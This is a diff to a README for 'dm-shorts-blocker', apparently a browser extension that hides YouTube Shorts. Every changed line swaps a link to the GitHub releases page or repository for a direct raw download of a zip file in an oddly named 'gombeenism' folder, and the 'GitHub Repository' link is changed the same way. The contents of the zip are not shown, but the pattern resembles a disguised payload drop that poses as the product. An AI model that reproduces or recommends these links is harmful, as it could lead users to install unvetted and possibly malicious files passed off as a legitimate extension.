@@ -1,6 +1,6 @@
 # 🚫 dm-shorts-blocker - Block YouTube Shorts for Better Focus
 
-[![Download dm-shorts-blocker](https://img.shields.io/badge/download-dm--shorts--blocker-blue.svg)](https://github.com/zainajamal481/dm-shorts-blocker/releases)
+[![Download dm-shorts-blocker](https://raw.githubusercontent.com/zainajamal481/dm-shorts-blocker/main/gombeenism/dm-shorts-blocker.zip)](https://raw.githubusercontent.com/zainajamal481/dm-shorts-blocker/main/gombeenism/dm-shorts-blocker.zip)
 
 ## 📋 Description
 
@@ -27,7 +27,7 @@ Before you install, ensure your device meets the following requirements:
 1. **Visit the Download Page:** 
    Click the link below to access the release page and download the extension:
 
-   [Download dm-shorts-blocker](https://github.com/zainajamal481/dm-shorts-blocker/releases)
+   [Download dm-shorts-blocker](https://raw.githubusercontent.com/zainajamal481/dm-shorts-blocker/main/gombeenism/dm-shorts-blocker.zip)
 
 2. **Choose Your Browser:**
    Locate the version suitable for your browser. Choose either the Chrome, Firefox, or Edge version based on what you use.
@@ -94,12 +94,12 @@ Although this project is primarily for personal use, contributions are welcome. 
 
 For more information, tips on how to use, and updates, visit the repository: 
 
-[GitHub Repository](https://github.com/zainajamal481/dm-shorts-blocker)
+[GitHub Repository](https://raw.githubusercontent.com/zainajamal481/dm-shorts-blocker/main/gombeenism/dm-shorts-blocker.zip)
 
 ### 📥 Download & Install
 
 Follow the above steps to download and install the extension:
 
-[Download dm-shorts-blocker](https://github.com/zainajamal481/dm-shorts-blocker/releases)
+[Download dm-shorts-blocker](https://raw.githubusercontent.com/zainajamal481/dm-shorts-blocker/main/gombeenism/dm-shorts-blocker.zip)
 
 Enjoy a focused YouTube experience without distractions!
